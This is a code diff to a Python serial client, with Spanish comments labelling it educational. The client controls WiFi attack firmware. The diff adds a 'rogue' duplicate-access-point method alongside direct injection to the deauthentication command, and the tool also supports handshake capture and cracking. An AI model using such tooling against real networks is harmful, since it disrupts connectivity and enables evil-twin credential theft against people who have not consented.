@@ -214,7 +214,7 @@ def print_help() -> None:
     print("scan                    - Escanear redes WiFi (channel hopping)")
     print("stop                    - Detener operación actual")
     print("lock <MAC> <CANAL>      - Fijar canal y capturar tráfico de un AP")
-    print("deauth <AP_MAC> --client <MAC>|--broadcast --reason <1-255> [--count N] [--delay ms]")
+    print("deauth <AP_MAC> --client <MAC>|--broadcast --reason <1-255> [--count N] [--delay ms] [--method direct|rogue]")
     print("                               - Enviar frames de deauthentication (educativo)")
     print("clients <MAC>                - Detectar clientes asociados a un AP")
     print("verify <modo> <pcap> <target> - Verificar handshake (dict/brute/raw)")
@@ -341,6 +341,7 @@ def parse_and_send_cmd(cmd_input: str, ser: serial.Serial) -> bool:
         reason = 7  # Default: Class 3 frame received
         count = 10  # Default
         delay = 100  # Default ms
+        method = "direct"  # Default: inyección directa
         
         i = 2
         while i < len(parts):
@@ -382,6 +383,12 @@ def parse_and_send_cmd(cmd_input: str, ser: serial.Serial) -> bool:
                     print("[!] Delay debe ser un número entero")
                     return True
                 i += 1
+            elif parts[i] == "--method" and i + 1 < len(parts):
+                method = parts[i + 1].lower()
+                if method not in ["direct", "rogue"]:
+                    print("[!] Method debe ser 'direct' o 'rogue'")
+                    return True
+                i += 1
             else:
                 print(f"[!] Flag desconocido: {parts[i]}")
                 return True
@@ -396,15 +403,20 @@ def parse_and_send_cmd(cmd_input: str, ser: serial.Serial) -> bool:
             print("[*] Sin --client especificado, usando broadcast")
         
         # Construir comando para firmware
-        # Formato: CMD:DEAUTH:AP_MAC:CLIENT_MAC:REASON:COUNT:DELAY_MS
-        formatted_cmd = f"CMD:DEAUTH:{ap_mac}:{client_mac}:{reason}:{count}:{delay}\n"
+        # Formato: CMD:DEAUTH:AP_MAC:CLIENT_MAC:REASON:COUNT:DELAY_MS:METHOD
+        formatted_cmd = f"CMD:DEAUTH:{ap_mac}:{client_mac}:{reason}:{count}:{delay}:{method}\n"
         
         # Log pedagógico
         reason_desc = {1: "Unspecified", 2: "Previous auth invalid", 7: "Class 3 frame from nonassoc STA"}
         reason_text = reason_desc.get(reason, f"Custom ({reason})")
+        method_desc = "Inyección directa" if method == "direct" else "Rogue AP duplicado"
         print(f"[*] DEAUTH → AP: {ap_mac} | Client: {client_mac}")
-        print(f"[*] Reason: {reason_text} | Frames: {count} | Delay: {delay}ms")
-        print(f"[*] Enviando frames de deauthentication (vulnerabilidad 802.11)")
+        print(f"[*] Reason: {reason_text} | Frames: {count} | Delay: {delay}ms | Method: {method_desc}")
+        
+        if method == "rogue":
+            print(f"[!] Rogue AP: Esperando que el cliente se conecte al AP falso...")
+        else:
+            print(f"[*] Enviando frames de deauthentication (vulnerabilidad 802.11)")
         
         ser.write(formatted_cmd.encode('utf-8'))
     elif cmd_input == "clients":
